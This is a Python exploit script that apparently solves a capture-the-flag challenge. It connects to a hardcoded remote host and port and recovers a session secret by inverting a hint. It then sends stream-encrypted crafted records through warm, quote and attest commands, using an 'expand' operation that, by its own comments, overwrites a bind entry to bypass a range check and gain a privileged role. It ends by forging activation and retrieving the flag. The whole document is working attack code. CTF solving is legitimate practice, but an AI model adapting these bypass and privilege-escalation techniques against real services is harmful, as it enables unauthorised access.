#!/usr/bin/env python3
import socket, time, re, sys
from pathlib import Path
MASK=0xffffffff; P=0x1000193; O=0x811c9dc5
# usage: python3 solve_canopy.py [host] [port] [wasm_path]
WASM_PATH = Path(sys.argv[3]) if len(sys.argv) > 3 else Path('blessed_proxy.wasm')
WASM = WASM_PATH.read_bytes()

def rol(x,n): n&=31; return ((x<<n)|(x>>(32-n))) & MASK

def ror(x,n): n&=31; return ((x>>n)|(x<<(32-n))) & MASK

def inv_hint(h): return ror((h-0x19d3b42e)&MASK,7) ^ 0xa5c31f27

def uvar(n):
    out=[]
    while True:
        b=n&0x7f; n >>=7
        if n: out.append(b|0x80)
        else:
            out.append(b); return bytes(out)

def stream(data, seed):
    x=seed&MASK; out=bytearray(data)
    for i in range(len(out)):
        x=(x*0x19660d + 0x3c6ef35f)&MASK
        out[i] ^= (x>>24)&0xff
    return bytes(out)
class Slot:
    def __init__(self): self.b=bytearray(0x7cc)
    def setb(self,o,v): self.b[o]=v&0xff
    def setw(self,o,v): self.b[o:o+2]=int(v).to_bytes(2,'little')

def parse_mesh(data):
    s=Slot(); body=data[15:]; o=2
    for _ in range(body[1]):
        typ=body[o]; l=int.from_bytes(body[o+1:o+3],'little'); d=body[o+3:o+3+l]; o+=3+l
        if typ==1: s.setw(3,int.from_bytes(d[:2],'little'))
        elif typ==2:
            cnt=d[0]; s.setb(7,cnt); p=1
            for i in range(cnt):
                ln=d[p]; p+=1
                s.b[0xe+i*0x14:0xe+i*0x14+16]=b'\0'*16
                s.b[0xe+i*0x14:0xe+i*0x14+ln]=d[p:p+ln]; p += ln
                s.setb(0x1e+i*0x14,d[p]); p += 1
        elif typ==3:
            cnt=d[0]; s.setb(6,cnt); p=1
            for i in range(cnt):
                ln=int.from_bytes(d[p:p+2],'little'); p += 2
                s.setw(0x86+i*2,ln)
                s.b[0x9e+i*0x60:0x9e+i*0x60+ln]=d[p:p+ln]; p += ln
        elif typ==4:
            cnt=d[0]; s.setb(0xa,cnt); s.b[0x51e:0x51e+cnt*4]=d[1:1+cnt*4]
        elif typ==5:
            cnt=d[0]; s.setb(0xb,cnt); s.b[0x52e:0x52e+cnt*4]=d[1:1+cnt*4]
        elif typ==6:
            s.setb(8,len(d)); s.b[0x54e:0x54e+len(d)]=d
        elif typ==7:
            cnt=d[0]; s.setb(9,cnt); s.b[0x64e:0x64e+cnt*4]=d[1:1+cnt*4]
        elif typ==8:
            cnt=d[0]; s.setb(0xc,cnt); s.b[0x53e:0x53e+cnt*4]=d[1:1+cnt*4]
    s.setb(0,1); s.setb(1,1); s.setb(5,1)
    return s

def h1(s):
    b=s.b
    h=((b[3] ^ 0xd74ea890)*P)&MASK
    for off in [5,6,7,10,11,12]: h=(((h^b[off])^O)*P)&MASK
    for i in range(min(b[7],6)):
        h ^= O
        name=bytes(b[0xe+i*0x14:0xe+i*0x14+16]).split(b'\0',1)[0]
        for ch in name: h=((h^ch)*P)&MASK
        h=(((b[0x1e+i*0x14]^h)^O)*P)&MASK
    for i in range(min(b[6],6)):
        ln=int.from_bytes(b[0x86+i*2:0x88+i*2],'little')
        h=(((b[0x86+i*2]^h)^O)*P)&MASK
        h=(((b[0x87+i*2]^h)*P)&MASK)^O
        for ch in b[0x9e+i*0x60:0x9e+i*0x60+ln]: h=((h^ch)*P)&MASK
    for off,cnt in [(0x51e,10),(0x52e,11),(0x53e,12)]:
        for i in range(min(b[cnt],4)):
            h ^= O
            for ch in b[off+i*4:off+i*4+4]: h=((h^ch)*P)&MASK
    return h&MASK

def h0(s):
    b=s.b; h=h1(s)
    h=(((b[4]^h)^O)*P)&MASK
    h=(((b[8]^h)^O)*P)&MASK
    h ^= O
    for ch in b[0x54e:0x54e+b[8]]: h=((h^ch)*P)&MASK
    h=(((b[9]^h)^O)*P)&MASK
    h ^= O
    for ch in b[0x64e:0x64e+b[9]*4]: h=((h^ch)*P)&MASK
    return h&MASK

def h2(s):
    b=s.b; h=((b[6]^0xc444d980)*P)&MASK
    for i in range(min(b[6],6)):
        ln=int.from_bytes(b[0x86+i*2:0x88+i*2],'little')
        h=((((ln&0xff)^h)^O)*P)&MASK
        h=((((ln>>8)&0xff)^h)*P)&MASK; h ^= O
        for ch in b[0x9e+i*0x60:0x9e+i*0x60+ln]: h=((h^ch)*P)&MASK
    return h&MASK

class C:
    def __init__(self, host, port):
        self.s=socket.create_connection((host,port),timeout=8)
        self.s.settimeout(0.25)
        self.recv(0.25)
    def recv(self, delay=0.08):
        time.sleep(delay); data=b''
        while True:
            try:
                chunk=self.s.recv(65535)
                if not chunk: break
                data += chunk
            except socket.timeout:
                break
        return data.decode('latin1','replace')
    def cmd(self, line):
        self.s.sendall(line.encode()+b'\n')
        out=self.recv()
        print(f'> {line}\n{out}', end='')
        return out

def main():
    host=sys.argv[1] if len(sys.argv)>1 else '178.105.199.41'
    port=int(sys.argv[2]) if len(sys.argv)>2 else 31347
    slot=parse_mesh(WASM)
    c=C(host,port)
    out=c.cmd('status')
    hint=int(re.search(r'session_hint=0x([0-9a-fA-F]+)', out).group(1),16)
    rand2=inv_hint(hint)
    c.cmd('upload 0 '+WASM.hex())

    # Warm image: bytes at offset 24 are the privileged sweep vector [kind=2, role=1, acct=1, flags=1].
    image=bytearray(28); image[24:28]=b'\x02\x01\x01\x01'
    profile_plain=uvar(1)+uvar(0)+uvar(len(image))+bytes(image)
    warm_seed=(slot.b[0xc]*0x45d9f3b) ^ rand2 ^ rol(h1(slot),3) ^ (slot.b[9]*0x9e3779b9) ^ 0x5741524d
    c.cmd('warm 0 '+stream(profile_plain,warm_seed).hex())

    out=c.cmd('sync 0')
    profile_root=int(re.search(r'profile_root=0x([0-9a-fA-F]+)', out).group(1),16)

    # Quote records make quote_loaded=2, quote_writable=1, with quote list[0]==1.
    quote_plain=(uvar(2)+
                 uvar(2)+uvar(0)+bytes([0,1,1,0])+
                 uvar(2)+uvar(1)+bytes([1,1,1,0]))
    quote_seed=(len(image)*0x7f4a7c15) ^ rand2 ^ profile_root ^ rol(h0(slot),11) ^ 0x51554f54
    out=c.cmd('quote 0 '+stream(quote_plain,quote_seed).hex())
    quote_root=int(re.search(r'quote_root=0x([0-9a-fA-F]+)', out).group(1),16)

    # Witness: create one bind entry, then use the expand op to overwrite it with
    # [route=0, quote_idx=0, image_offset=24, flags=0], bypassing the bind range check.
    comp=bytes([0xf5,0x00,0x03,0x00,0x00,0x18,0x00])  # expand: 12 NULs, then 00 00 18 00 at +0x7a8
    attest_plain=(uvar(4)+
                  uvar(0)+uvar(len(comp))+comp+
                  uvar(2)+bytes([0,0,0,0])+
                  uvar(3)+uvar(0)+uvar(0)+uvar(len(comp))+
                  uvar(4)+b'\x01')
    attest_seed=(1*0x6c8e9cf5) ^ rand2 ^ quote_root ^ rol(h2(slot),17) ^ 0x41545453
    c.cmd('attest 0 '+stream(attest_plain,attest_seed).hex())

    out=c.cmd('bless 0')
    seal=re.search(r'SEAL ([0-9a-f]+)', out).group(1)
    c.cmd('activate 0 '+seal)
    c.cmd('invoke fallback')
    out=c.cmd('flag')
    m=re.search(r'(slopped\{[^}\n]+\})', out)
    if m:
        print('\nFLAG:', m.group(1))
        return 0
    return 1
if __name__=='__main__':
    raise SystemExit(main())
